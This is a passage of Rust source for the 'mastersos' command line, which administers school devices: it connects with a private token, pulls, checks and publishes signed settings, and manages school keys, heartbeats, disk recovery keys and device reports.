//! The `mastersos` command line. Settings live in a local directory (`init`, `pull`, `check`,
//! `diff`, `publish`); the server holds no draft. The read commands that touch the server go
//! through [`crate::call`].
//!
//! Output is a table or the text itself for people; `--json` prints the server's JSON for scripts.

use std::path::{Path, PathBuf};
use std::process::ExitCode;

use clap::{Parser, Subcommand};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};

use mastersos_bundle::{AgeBand, ClassRole, Kind, OrgRole};

use crate::explain::{self as explain_mod, UserQuery};
use crate::publish::SignWith;
use crate::server::{CliError, SchoolEntry, Server};
use crate::workdir::{self, Meta, Workdir};
use crate::{call, check_server, connect, Api, OpError, Req};

const EXIT_CODES: &str = "Exit codes: 0 success; 1 failure (network, token, the server refused); \
2 `check` or `publish` found errors in the local settings (or `publish` found a secret rerouted without --allow-reroute).";

#[derive(Parser)]
#[command(
    name = "mastersos",
    version,
    about = "MastersOS admin command line: edit a school's settings in a local directory (pull, edit manifest.toml, check, diff) and publish them; inspect Devices.",
    after_help = EXIT_CODES
)]
pub struct Cli {
    // The defaults name the settings folder the way this platform writes it (spec 2026-11-04 §4.7)
    /// Admin server address, for example https://server.example/org/<organisation>/devices
    #[cfg_attr(
        not(windows),
        doc = "(default: `server` in ~/.config/mastersos/config.toml)"
    )]
    #[cfg_attr(
        windows,
        doc = r"(default: `server` in %APPDATA%\mastersos\config.toml)"
    )]
    #[arg(long, global = true)]
    server: Option<String>,
    /// File holding the token from the Command line page, never accepted on the command line
    #[cfg_attr(
        not(windows),
        doc = "(default: `token_file` in the config file, else ~/.config/mastersos/token)"
    )]
    #[cfg_attr(
        windows,
        doc = r"(default: `token_file` in the config file, else %APPDATA%\mastersos\token)"
    )]
    #[arg(long, global = true)]
    token_file: Option<PathBuf>,
    /// Print the server's JSON instead of tables: for scripts
    #[arg(long, global = true)]
    json: bool,
    /// Where this computer keeps what it verified of each server's published versions
    #[cfg_attr(not(windows), doc = "(default: ~/.config/mastersos/pins)")]
    #[cfg_attr(windows, doc = r"(default: %APPDATA%\mastersos\pins)")]
    #[arg(long, global = true, value_name = "DIR")]
    pin_dir: Option<PathBuf>,
    /// No person is answering: never ask (a choice that needs one is refused). It never confirms trusted keys: the first time a school is checked needs a person at a terminal, or each of the trusted keys given by --key-file or --trust-fingerprint
    #[arg(long, global = true)]
    yes: bool,
    /// The first time a school is checked without a person (--yes, --json, or no terminal): a fingerprint (xxxx-xxxx-xxxx-xxxx) from the School keys page; give one for each of the trusted keys that is not your --key-file
    #[arg(long = "trust-fingerprint", global = true, value_name = "FP", value_parser = parse_fingerprint)]
    trust_fingerprint: Vec<String>,
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Connect this computer to a school's admin server: paste the token from the Command line page; it is checked, then saved with the server address
    Connect {
        /// The admin server address, for example https://server.example/org/<organisation>/devices
        server_url: String,
    },
    /// Start a local settings directory for a school that has published nothing yet, approved by the school keys given
    Init {
        /// The directory to create (it must be empty or not exist)
        dir: PathBuf,
        /// A school key file, or `-` for the first line of stdin; give it once for each school key (two is good). Make one with `mastersos key new`, then register it with `mastersos key register`
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: Vec<PathBuf>,
        /// The school's id (a lowercase UUID); without it the schools you administer are listed and the only one is taken
        #[arg(long, value_name = "UUID")]
        school: Option<String>,
    },
    /// Download the latest published settings (checked on this computer, version by version) into a local directory
    Pull {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
        /// Pull this published version instead of the latest
        #[arg(long)]
        version: Option<u64>,
        /// Overwrite local changes that are not published
        #[arg(long)]
        force: bool,
        /// The school's id (a lowercase UUID; default: `school_id` in the directory's mastersos.toml)
        #[arg(long, value_name = "UUID")]
        school: Option<String>,
    },
    /// Check the local settings directory the way publishing would (no network)
    Check {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
    },
    /// Show what changed in the local settings directory since the last pull (no network; secrets by name only)
    Diff {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
    },
    /// Explain the local settings (no network): which user config a person gets, or what a Device gets
    #[command(subcommand)]
    Explain(ExplainCmd),
    /// Rewrite the local settings as format 3 (Device configs and user configs) with the same behaviour, then check them (no network)
    Migrate {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
        /// Write manifest.toml instead of printing the new text
        #[arg(long)]
        write: bool,
    },
    /// Devices and their latest reports
    #[command(subcommand)]
    Devices(DevicesCmd),
    /// The Settings reference (Markdown): the short version, one section, or all of it
    Spec {
        /// One section: an issue code (icon_invalid), a table name (config, group, config.apps.web, school.oidc) or top-level
        #[arg(long)]
        section: Option<String>,
        /// The whole reference (long)
        #[arg(long, conflicts_with = "section")]
        full: bool,
    },
    /// Publish the local settings directory: check, fill in secrets, stamp, upload, then approve with the school key file (--key-file)
    Publish {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin: check and approve on this computer. Required
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: Option<PathBuf>,
        /// IT approves that secret NAME may go to its changed network (`secret_rerouted`); give it once per rerouted secret. Without it publish refuses. Never passed by an AI
        #[arg(long = "allow-reroute", value_name = "NAME")]
        allow_reroute: Vec<String>,
    },
    /// The school keys: make one, register it, list them, or add or remove one in the local settings directory
    #[command(subcommand)]
    Key(KeyCmd),
    /// Check every published version on this computer (the first time, you confirm the key fingerprints)
    Verify {
        /// The school's id (a lowercase UUID; default: `school_id` in ./mastersos.toml)
        #[arg(long, value_name = "UUID")]
        school: Option<String>,
    },
    /// Monthly check-in: confirm to every computer that the latest settings are current
    Heartbeat {
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: PathBuf,
        /// How many days the check-in lasts, 1 to 31
        #[arg(long, default_value_t = 30, value_parser = clap::value_parser!(i64).range(1..=31))]
        days: i64,
    },
    /// A computer's disk recovery keys
    #[command(subcommand)]
    Recovery(RecoveryCmd),
    /// Install files
    #[command(subcommand)]
    Seed(SeedCmd),
    /// Read a password twice without echo and print its yescrypt hash for the IT account (it_account.password_hash)
    HashPassword,
    /// The school's logos
    #[command(subcommand)]
    Logo(LogoCmd),
    /// Sign in to the server given with --server: confirm a code in the browser; the sign-in is saved for this user only
    Login {
        /// Print the address to open instead of opening the browser
        #[arg(long)]
        no_browser: bool,
    },
    /// Forget the sign-in saved by `mastersos login`
    Logout,
}

#[derive(Subcommand)]
enum ExplainCmd {
    /// The user config a person gets on each Group, and the rule (with its line in manifest.toml) that gives it
    User {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
        /// The account kind: sso, local or guest
        #[arg(long, value_parser = parse_enum::<Kind>)]
        kind: Kind,
        /// The person is an administrator on the Device (not with --kind guest)
        #[arg(long)]
        admin: bool,
        /// The login name (default: `guest` with --kind guest, otherwise none, so no `user` condition matches)
        #[arg(long)]
        user: Option<String>,
        /// The person's role in the organisation: owner, admin or member (sso only)
        #[arg(long, value_parser = parse_enum::<OrgRole>)]
        org_role: Option<OrgRole>,
        /// A role in a class: teacher, assistant or student; give it once per --class (pairs by position), or once for every class. A role without a class matches only class_role conditions (sso only)
        #[arg(long, value_parser = parse_enum::<ClassRole>)]
        class_role: Vec<ClassRole>,
        /// A class id the person is in (sso only)
        #[arg(long)]
        class: Vec<String>,
        /// An org-tree node of the person, and each of its parents (sso only)
        #[arg(long)]
        org_node: Vec<String>,
        /// The person's age band: under13, 13-17 or 18+ (sso only)
        #[arg(long, value_parser = parse_enum::<AgeBand>)]
        age_band: Option<AgeBand>,
        /// The person's subject id at the sign-in service (sso only)
        #[arg(long)]
        sub: Option<String>,
        /// Only this Group (default: every Group)
        #[arg(long)]
        device_group: Option<String>,
    },
    /// The Group, device config, reachable user configs and installed apps of the Device with this serial number
    Device {
        /// The serial number
        serial: String,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
}

/// A value of one of the settings' lowercase names (`sso`, `teacher`, `13-17`, ...).
fn parse_enum<T: serde::de::DeserializeOwned>(s: &str) -> Result<T, String> {
    serde_json::from_value(Value::String(s.to_owned()))
        .map_err(|_| format!("{s:?} is not one of the values listed in --help"))
}

#[derive(Subcommand)]
enum KeyCmd {
    /// Create a school key on this computer, without the network. It is never written over an existing file. Prints only its key code and fingerprint
    New {
        /// The file to write, or an existing directory (the file is then named `<school>-school-key-<key code>.kit`)
        #[arg(long, value_name = "PATH")]
        out: PathBuf,
        /// A short school name for the file name, such as `alpha`
        #[arg(long, value_name = "NAME")]
        school: Option<String>,
    },
    /// Register the school key with the server, then the disk unlocking that belongs to it
    Register {
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: PathBuf,
        /// A name people will recognise
        #[arg(long, value_name = "TEXT")]
        label: String,
    },
    /// List the school keys registered for this school: key code, label, registered date, whether the published settings and the local directory have them
    List {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
    /// Add the school key in FILE (registered with `mastersos key register`) to the local manifest.toml; then publish with a school key already in use
    Add {
        /// The school key file, or `-` for the first line of stdin
        #[arg(value_name = "FILE")]
        file: PathBuf,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
    /// Remove the school key with this key code (for example 11d9-03eb) from the local manifest.toml; then publish
    Remove {
        /// The key code, with or without the dash
        #[arg(value_name = "KEY CODE")]
        code: String,
        /// That school key's file, if you still have it: then the disk-unlocking entry that belongs to it is removed too, even in an older manifest.toml
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: Option<PathBuf>,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
}

#[derive(Subcommand)]
enum RecoveryCmd {
    /// Unlock a computer's disk: open its stored recovery keys on this computer with the school key (every read is recorded on the server)
    Read {
        /// The computer's device id
        #[arg(value_name = "DEVICE")]
        device: String,
        /// The school key file (keep it on a USB stick; only you should be able to read it), or `-` for the first line of stdin
        #[arg(long = "key-file", value_name = "PATH")]
        key_file: PathBuf,
    },
}

#[derive(Subcommand)]
enum SeedCmd {
    /// Compare an install file with the keys and version verified on this computer
    Check {
        /// The install file
        #[arg(value_name = "FILE")]
        file: PathBuf,
    },
}

#[derive(Subcommand)]
enum LogoCmd {
    /// Check the sizes locally, upload both PNGs and print their sha256 and the [school] lines to paste
    Upload {
        /// The sign-in screen logo: 96 pixels high, 1 to 480 wide
        login: PathBuf,
        /// The icon: 40x40
        icon: PathBuf,
    },
}

#[derive(Subcommand)]
enum DevicesCmd {
    /// List Devices with their latest report
    List {
        /// Only Devices in this group
        #[arg(long)]
        group: Option<String>,
    },
    /// One Device's latest report (by device id or serial number)
    Show { device: String },
}

/// `~/.config/mastersos/config.toml`.
#[derive(Default, Deserialize, Serialize)]
struct ConfigFile {
    server: Option<String>,
    token_file: Option<PathBuf>,
}

fn config_dir() -> Result<PathBuf, OpError> {
    crate::platform::config_dir("mastersos").map_err(fail)
}

fn load_config() -> Result<ConfigFile, OpError> {
    let path = config_dir()?.join("config.toml");
    match std::fs::read_to_string(&path) {
        Ok(text) => toml::from_str(&text)
            .map_err(|e| OpError::Failed(format!("{} is not valid: {e}", path.display()))),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(ConfigFile::default()),
        Err(e) => Err(OpError::Failed(format!(
            "Could not read {}: {e}",
            path.display()
        ))),
    }
}

/// The command line's entry point.
pub async fn main() -> ExitCode {
    let cli = Cli::parse();
    let json = cli.json;
    match run(cli).await {
        Ok(code) => code,
        Err(e) => {
            if let OpError::Refused { message, issues } = &e {
                if json {
                    // Every refusal in the shape of the check's: {"written": false, "error", "issues"?}.
                    let mut v = json!({ "written": false, "error": message });
                    if let Some(i) = issues {
                        v["issues"] = Value::Array(i.clone());
                    }
                    println!("{v}");
                } else if let Some(i) = issues {
                    print_issues(i);
                }
            }
            // The message never holds the token: only the address and the server's error text.
            eprintln!("mastersos: {}", e.message());
            ExitCode::from(e.exit_code())
        }
    }
}

/// Print what a protocol v1 command gave: its output, or its error (`--json` on stdout).
fn finish(r: Result<String, crate::server::CliError>, json: bool) -> ExitCode {
    match r {
        Ok(out) => {
            print!("{out}");
            ExitCode::SUCCESS
        }
        Err(e) => {
            crate::server::print_error(&e, json);
            ExitCode::from(u8::try_from(crate::server::exit_code(&e)).unwrap_or(1))
        }
    }
}

async fn run(cli: Cli) -> Result<ExitCode, OpError> {
    let Cli {
        server,
        token_file,
        json,
        pin_dir: pin_flag,
        yes,
        trust_fingerprint,
        cmd,
    } = cli;
    let pin_dir = || pin_dir_op(pin_flag.as_deref());
    let pins_read = || pins_to_read(pin_flag.as_deref()).map_err(|e| OpError::Failed(e.message));
    // Sign-in commands: before the config file and the old server address are read.
    match &cmd {
        Cmd::Login { no_browser } => {
            let r = crate::auth::login(server.as_deref(), *no_browser, json).await;
            return Ok(finish(r, json));
        }
        Cmd::Logout => return Ok(finish(crate::auth::logout(json), json)),
        _ => {}
    }
    // Protocol v1 commands: credentials from arbella or `mastersos login`, no config file.
    if matches!(
        cmd,
        Cmd::Init { .. } | Cmd::Pull { .. } | Cmd::Verify { .. }
    ) {
        let o = V1 {
            json,
            yes,
            server: server.clone(),
            pin_flag: pin_flag.clone(),
            fingerprints: trust_fingerprint.clone(),
        };
        return Ok(finish(v1_command(&o, cmd).await, json));
    }
    if let Cmd::Connect { server_url } = &cmd {
        if server.is_some() {
            return Err(OpError::Failed(
                "`mastersos connect` takes the server address as its argument (`mastersos connect <SERVER_URL>`); --server is not used here"
                    .into(),
            ));
        }
        // Before the config file is read, so a broken one gets rewritten.
        return connect_school(server_url, token_file).await;
    }
    // Offline commands: no server address, no token.
    match &cmd {
        // Offline: the pins are read, never created.
        Cmd::Check { dir } => return local_check(dir.as_deref(), &pins_read()?, json),
        Cmd::Diff { dir } => return local_diff(dir.as_deref(), &pins_read()?),
        Cmd::Explain(c) => return explain(c, json),
        Cmd::Migrate { dir, write } => return migrate(dir.as_deref(), &pin_dir()?, *write, json),
        Cmd::HashPassword => return hash_password(),
        Cmd::Key(KeyCmd::New { out, school }) => return key_new(out, school.as_deref()),
        Cmd::Logo(LogoCmd::Upload { login, icon }) => {
            // Wrong sizes are refused before the config, the token or the network is touched.
            logo_body(login, icon)?;
        }
        // Only the local manifest.toml changes, and nothing from the server decides what.
        Cmd::Key(KeyCmd::Remove {
            code,
            key_file,
            dir,
        }) => {
            return keys_remove(
                dir.as_deref(),
                code,
                key_file.as_deref(),
                server.as_deref(),
                token_file.as_deref(),
            )
            .await
        }
        // Settings are approved on this computer with the school key; nothing is uploaded without it.
        Cmd::Publish { key_file: None, .. } => {
            return Err(OpError::Failed(
                "Publishing needs the school key file: mastersos publish --key-file <PATH>".into(),
            ))
        }
        _ => {}
    }
    // School key files that cannot be read (not private, not a school key) stop before the network.
    let school_keys = match &cmd {
        Cmd::Key(KeyCmd::Add { file, .. }) => load_school_keys(std::slice::from_ref(file))?,
        _ => Vec::new(),
    };
    let sign_with = match &cmd {
        Cmd::Publish {
            key_file: Some(p), ..
        } => Some(SignWith::key_file(p).map_err(fail)?),
        _ => None,
    };
    let kit = match &cmd {
        Cmd::Heartbeat { key_file, .. }
        | Cmd::Recovery(RecoveryCmd::Read { key_file, .. })
        | Cmd::Key(KeyCmd::Register { key_file, .. }) => {
            Some(crate::sign::kit::load_key_file(key_file).map_err(fail)?)
        }
        _ => None,
    };
    // The install file is read before the network too, so a wrong path fails fast.
    let seed_text = match &cmd {
        Cmd::Seed(SeedCmd::Check { file }) => Some(
            std::fs::read_to_string(file)
                .map_err(|e| OpError::Failed(format!("Could not read {}: {e}", file.display())))?,
        ),
        _ => None,
    };
    let cfg = load_config()?;
    let server = server.or(cfg.server).ok_or_else(|| {
        OpError::Failed(
            "No server address: run `mastersos connect https://server.example/org/<organisation>/devices` first, or pass --server"
                .into(),
        )
    })?;
    let token_file = match token_file.or(cfg.token_file) {
        Some(p) => p,
        None => config_dir()?.join("token"),
    };
    check_private(&token_file, TOKEN_AGAIN)?;
    let api = connect(&server, &token_file)
        .await
        .map_err(|e| OpError::Failed(e.to_string()))?;
    let out = Out { json };
    let kit = kit.as_ref();
    match cmd {
        Cmd::Connect { .. }
        | Cmd::Login { .. }
        | Cmd::Logout
        | Cmd::Check { .. }
        | Cmd::Diff { .. }
        | Cmd::Explain(_)
        | Cmd::Migrate { .. }
        | Cmd::HashPassword
        | Cmd::Key(KeyCmd::New { .. })
        | Cmd::Key(KeyCmd::Remove { .. })
        | Cmd::Init { .. }
        | Cmd::Pull { .. }
        | Cmd::Verify { .. } => {
            unreachable!("handled above")
        }
        Cmd::Devices(c) => devices(&api, &out, c).await,
        Cmd::Spec { section, full } => spec(&api, section, full).await,
        Cmd::Publish {
            dir, allow_reroute, ..
        } => {
            publish_dir(
                &api,
                &server,
                &token_file,
                dir.as_deref(),
                &pin_dir()?,
                sign_with.ok_or_else(|| fail("no school key"))?,
                &allow_reroute,
                json,
            )
            .await
        }
        Cmd::Key(KeyCmd::Register { label, .. }) => {
            key_register(
                &server,
                &token_file,
                kit.ok_or_else(|| fail("no school key"))?,
                &label,
            )
            .await
        }
        Cmd::Key(KeyCmd::List { dir }) => keys_list(&api, &out, dir.as_deref()).await,
        Cmd::Key(KeyCmd::Add { dir, .. }) => {
            keys_add(&api, &server, dir.as_deref(), &school_keys).await
        }
        Cmd::Heartbeat { days, .. } => {
            heartbeat(
                &server,
                &token_file,
                &pin_dir()?,
                kit.ok_or_else(|| fail("no school key"))?,
                days,
            )
            .await
        }
        Cmd::Recovery(RecoveryCmd::Read { device, .. }) => {
            recovery_read(
                &server,
                &token_file,
                kit.ok_or_else(|| fail("no school key"))?,
                &device,
            )
            .await
        }
        Cmd::Seed(SeedCmd::Check { .. }) => {
            let text = seed_text.ok_or_else(|| fail("no install file"))?;
            seed_check(&server, &token_file, &pin_dir()?, &text).await
        }
        Cmd::Logo(LogoCmd::Upload { login, icon }) => {
            let body = logo_body(&login, &icon)?;
            let text = api
                .send(Req::post_json(&["v1", "admin", "logos"], body))
                .await?;
            let v: Value = serde_json::from_str(&text).map_err(fail)?;
            if out.json {
                println!("{text}");
            } else {
                println!("{}", crate::logo::report(&v).map_err(OpError::Failed)?);
            }
            Ok(ExitCode::SUCCESS)
        }
    }
}

/// `--trust-fingerprint`: four groups of four hex digits joined by `-`, taken in lowercase.
fn parse_fingerprint(s: &str) -> Result<String, String> {
    let fp = s.to_ascii_lowercase();
    let ok = fp.len() == 19
        && fp.split('-').count() == 4
        && fp
            .split('-')
            .all(|g| g.len() == 4 && g.bytes().all(|b| b.is_ascii_hexdigit()));
    if ok {
        Ok(fp)
    } else {
        Err("a fingerprint is four groups of four hex digits, like 1a2b-3c4d-5e6f-7a8b".into())
    }
}

/// Where the pins are kept: `--pin-dir`, else `pins` in this computer's settings folder. Nothing
/// is created: the offline commands only read pins.
fn pin_dir_path(flag: Option<&Path>) -> Result<PathBuf, CliError> {
    match flag {
        Some(d) => Ok(d.to_path_buf()),
        None => crate::platform::config_dir("mastersos")
            .map(|c| c.join("pins"))
            .map_err(|e| CliError::new("local_file", &format!("{e:#}"))),
    }
}

/// [`pin_dir_path`] for the offline commands, which only read pins: nothing is created, but an
/// existing directory that is a link or another user's is refused.
fn pins_to_read(flag: Option<&Path>) -> Result<PathBuf, CliError> {
    let dir = pin_dir_path(flag)?;
    crate::platform::private_dir(&dir, false)
        .map_err(|e| CliError::new("local_file", &format!("{e:#}")))?;
    Ok(dir)
}

/// [`pin_dir_path`] for the commands that verify a chain: the settings folder and the pins
/// directory are made private (0700; refused when a link or another user's).
fn resolve_pin_dir(flag: Option<&Path>) -> Result<PathBuf, CliError> {
    let local = |e: anyhow::Error| CliError::new("local_file", &format!("{e:#}"));
    let dir = pin_dir_path(flag)?;
    if flag.is_none() {
        if let Some(cfg) = dir.parent() {
            crate::platform::private_dir(cfg, true).map_err(local)?;
        }
    }
    crate::platform::private_dir(&dir, true).map_err(local)?;
    Ok(dir)
}

/// [`resolve_pin_dir`] for the commands that still report an [`OpError`].
fn pin_dir_op(flag: Option<&Path>) -> Result<PathBuf, OpError> {
    resolve_pin_dir(flag).map_err(|e| OpError::Failed(e.message))
}

/// An error of the signing code: it may hold strings from the server, so it is escaped.
fn sign_fail(e: anyhow::Error) -> OpError {
    OpError::Failed(crate::safe::text(&format!("{e:#}")))
}

/// `mastersos key new`: no network.
fn key_new(out: &Path, school: Option<&str>) -> Result<ExitCode, OpError> {
    let (k, path) = crate::sign::kit::kit_new_in(out, school).map_err(sign_fail)?;
    println!(
        "key code:    {}",
        mastersos_bundle::keyid::key_code(&k.key_id).unwrap_or(k.key_id)
    );
    println!("fingerprint: {}", k.fingerprint);
    let shown = std::path::absolute(&path).unwrap_or(path);
    println!("school key:  {}", shown.display());
    println!(
        "Print the school key file on paper and lock the printout away, register it with \
         `mastersos key register --key-file <file>`, then move the file to a USB stick \
         and delete it from this computer."
    );
    Ok(ExitCode::SUCCESS)
}

/// `mastersos key register`: the school key, then the disk unlocking bound to it.
async fn key_register(
    server: &str,
    token_file: &Path,
    kit: &mastersos_bundle::kit::Kit,
    label: &str,
) -> Result<ExitCode, OpError> {
    use crate::sign::kit::{is_already_registered, register_escrow_recipient};
    let api = sign_api(server, token_file)?;
    match crate::sign::register(&api, kit, label).await {
        Ok(id) => match mastersos_bundle::keyid::key_code(&id) {
            Some(code) => println!("Registered school key {code} ({id})."),
            None => println!("Registered key {id}."),
        },
        // Registered before (say the disk-unlocking step failed): go on to that step.
        Err(e) if is_already_registered(&e) => println!(
            "School key {} is already registered.",
            mastersos_bundle::keyid::key_code(&kit.key_id()).unwrap_or_else(|| kit.key_id())
        ),
        Err(e) => return Err(sign_fail(e)),
    }
    register_escrow_recipient(&api, kit, label, &mut std::io::stdout())
        .await
        .map_err(sign_fail)?;
    Ok(ExitCode::SUCCESS)
}

/// `mastersos heartbeat`.
async fn heartbeat(
    server: &str,
    token_file: &Path,
    pins: &Path,
    kit: &mastersos_bundle::kit::Kit,
    days: i64,
) -> Result<ExitCode, OpError> {
    let api = sign_api(server, token_file)?;
    crate::sign::sign_heartbeat(
        &api,
        kit,
        pins,
        days,
        &mut std::io::stdin().lock(),
        &mut std::io::stdout(),
    )
    .await
    .map_err(sign_fail)?;
    Ok(ExitCode::SUCCESS)
}

/// `mastersos recovery read <DEVICE>`.
async fn recovery_read(
    server: &str,
    token_file: &Path,
    kit: &mastersos_bundle::kit::Kit,
    device: &str,
) -> Result<ExitCode, OpError> {
    let api = sign_api(server, token_file)?;
    let n = crate::sign::kit::recovery_read(&api, kit, device, &mut std::io::stdout())
        .await
        .map_err(sign_fail)?;
    println!("{n} recovery key(s) opened.");
    Ok(ExitCode::SUCCESS)
}

/// `mastersos seed check <FILE>`, with the file's text (read before the network).
async fn seed_check(
    server: &str,
    token_file: &Path,
    pins: &Path,
    text: &str,
) -> Result<ExitCode, OpError> {
    let api = sign_api(server, token_file)?;
    crate::sign::seed_check(&api, pins, text, &mut std::io::stdout())
        .await
        .map_err(sign_fail)?;
    Ok(ExitCode::SUCCESS)
}

/// `mastersos connect <SERVER_URL>`: ask for the token without echo, check it with `whoami`, then
/// save the token and `config.toml` (owner only). Nothing is written when the token is refused.
async fn connect_school(
    server_url: &str,
    token_file: Option<PathBuf>,
) -> Result<ExitCode, OpError> {
    let base = check_server(server_url).map_err(|e| OpError::Failed(e.to_string()))?;
    let token = crate::platform::read_hidden_line("Paste the token from the Command line page: ")
        .map_err(fail)?;
    let token = token.trim();
    if token.is_empty() {
        return Err(OpError::Failed("No token was entered".into()));
    }
    let api = Api::new(server_url, token).map_err(|e| OpError::Failed(e.to_string()))?;
    let who = crate::whoami(&api)
        .await
        .map_err(|e| OpError::Failed(e.to_string()))?;
    let school: String = who["school_name"]
        .as_str()
        .map(|n| {
            n.chars()
                .filter(|c| !c.is_control())
                .take(64)
                .collect::<String>()
        })
        .filter(|n| !n.trim().is_empty())
        .unwrap_or_else(|| base.host_str().unwrap_or_default().to_owned());

    let dir = config_dir()?;
    let token_path = match token_file {
        Some(p) => std::path::absolute(&p)
            .map_err(|e| OpError::Failed(format!("Bad token file path {}: {e}", p.display())))?,
        None => dir.join("token"),
    };
    let config_path = dir.join("config.toml");
    let text = toml::to_string(&ConfigFile {
        server: Some(server_url.trim_end_matches('/').to_owned()),
        token_file: Some(token_path.clone()),
    })
    .map_err(|e| OpError::Failed(format!("Could not write the settings: {e}")))?;
    for p in [&token_path, &config_path] {
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).map_err(|e| {
                OpError::Failed(format!("Could not create {}: {e}", parent.display()))
            })?;
        }
    }
    crate::platform::write_private(&token_path, format!("{token}\n").as_bytes()).map_err(fail)?;
    crate::platform::write_private(&config_path, text.as_bytes()).map_err(fail)?;
    println!("Connected to {school}.");
    println!("Token saved in {}", token_path.display());
    println!("Settings saved in {}", config_path.display());
    Ok(ExitCode::SUCCESS)
}

/// The token file must be readable by its owner only.
fn check_private(path: &Path, again: &str) -> Result<(), OpError> {
    crate::platform::check_private(path).map_err(|e| {
        let why = format!("{e:#}");
        OpError::Failed(format!("{}. {again}", why.trim_end_matches('.')))
    })
}

/// How to replace a token file that [`check_private`] refuses.
const TOKEN_AGAIN: &str = "Or save a new token file: run `mastersos connect <SERVER_URL>` again.";

async fn devices(api: &Api, out: &Out, c: DevicesCmd) -> Result<ExitCode, OpError> {
    match c {
        DevicesCmd::List { group } => {
            let mut args = Map::new();
            if let Some(g) = group {
                args.insert("group".into(), Value::String(g));
            }
            let text = call(api, "devices_list", Value::Object(args)).await?;
            out.print(&text, |v| {
                let rows = items(v)
                    .iter()
                    .map(|d| {
                        let mut state: Vec<&str> = Vec::new();
                        for (k, label) in [
                            ("behind", "behind"),
                            ("has_errors", "errors"),
                            ("locked", "locked"),
                            ("stale", "stale"),
                        ] {
                            if d[k] == true {
                                state.push(label);
                            }
                        }
                        vec![
                            cell(&d["device_id"]),
                            cell(&d["serial"]),
                            cell(&d["group"]),
                            cell(&d["bundle_version"]),
                            cell(&d["last_seen"]),
                            if state.is_empty() {
                                "ok".into()
                            } else {
                                state.join(",")
                            },
                        ]
                    })
                    .collect();
                table(
                    &["DEVICE", "SERIAL", "GROUP", "VERSION", "LAST SEEN", "STATE"],
                    rows,
                )
            });
        }
        DevicesCmd::Show { device } => {
            let text = call(api, "device_show", json!({ "device": device })).await?;
            let found: Value = serde_json::from_str(&text).unwrap_or(Value::Null);
            if out.json {
                println!("{found}");
            } else if let Value::Object(m) = &found {
                for (k, v) in m {
                    println!("{k}: {}", cell(v));
                }
            }
        }
    }
    Ok(ExitCode::SUCCESS)
}

async fn spec(api: &Api, section: Option<String>, full: bool) -> Result<ExitCode, OpError> {
    let text = if full {
        let body = api.send(Req::get(&["v1", "spec", "manifest"])).await?;
        let v: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
        v["text"].as_str().map_or(body, str::to_owned)
    } else {
        let args = match section {
            Some(s) => json!({ "section": s }),
            None => json!({}),
        };
        call(api, "spec", args).await?
    };
    print!("{text}");
    if !text.ends_with('\n') {
        println!();
    }
    Ok(ExitCode::SUCCESS)
}

/// How results are printed.
struct Out {
    json: bool,
}

impl Out {
    /// The server's JSON with `--json`, else what `human` makes of it.
    fn print(&self, text: &str, human: impl FnOnce(&Value) -> String) {
        if self.json {
            println!("{text}");
        } else {
            let v: Value = serde_json::from_str(text).unwrap_or(Value::Null);
            println!("{}", human(&v));
        }
    }
}

fn items(v: &Value) -> &[Value] {
    v.as_array().map_or(&[], Vec::as_slice)
}

/// One value for a table cell or a line.
fn cell(v: &Value) -> String {
    match v {
        Value::Null => "-".into(),
        Value::String(s) => s.clone(),
        Value::Array(a) => a.iter().map(cell).collect::<Vec<_>>().join(", "),
        other => other.to_string(),
    }
}

fn table(headers: &[&str], rows: Vec<Vec<String>>) -> String {
    let mut widths: Vec<usize> = headers.iter().map(|h| h.chars().count()).collect();
    for r in &rows {
        for (w, c) in widths.iter_mut().zip(r) {
            *w = (*w).max(c.chars().count());
        }
    }
    let line = |cells: Vec<&str>| {
        let mut s = String::new();
        for (i, (c, w)) in cells.iter().zip(&widths).enumerate() {
            if i + 1 == cells.len() {
                s.push_str(c);
            } else {
                s.push_str(c);
                s.push_str(&" ".repeat(w - c.chars().count() + 2));
            }
        }
        s.trim_end().to_owned()
    };
    let mut out = vec![line(headers.to_vec())];
    out.extend(
        rows.iter()
            .map(|r| line(r.iter().map(String::as_str).collect())),
    );
    out.join("\n")
}

fn fail(e: impl std::fmt::Display) -> OpError {
    OpError::Failed(format!("{e:#}"))
}

/// The settings directory, its base checked against this computer's pins.
fn open_dir(dir: Option<&Path>, pins: &Path) -> Result<Workdir, OpError> {
    Ok(Workdir::open(dir.unwrap_or_else(|| Path::new(".")))
        .map_err(fail)?
        .with_pins(pins))
}

fn lint_values(lints: &[mastersos_bundle::Lint]) -> Vec<Value> {
    lints
        .iter()
        .map(|l| serde_json::to_value(l).unwrap_or(Value::Null))
        .collect()
}

/// What `mastersos check` prints after the issues when secrets are rerouted: publishing stops
/// on them until IT approves each one by name.
fn reroute_notice(lints: &[mastersos_bundle::Lint]) -> Option<String> {
    // `rerouted_names` keeps only valid names (a-z, 0-9, -); checked again here because the
    // names go into a command IT may paste.
    let names = mastersos_bundle::secret_ref::rerouted_names(lints);
    if names.is_empty()
        || !names
            .iter()
            .all(|n| mastersos_bundle::secret_ref::is_valid_name(n))
    {
        return None;
    }
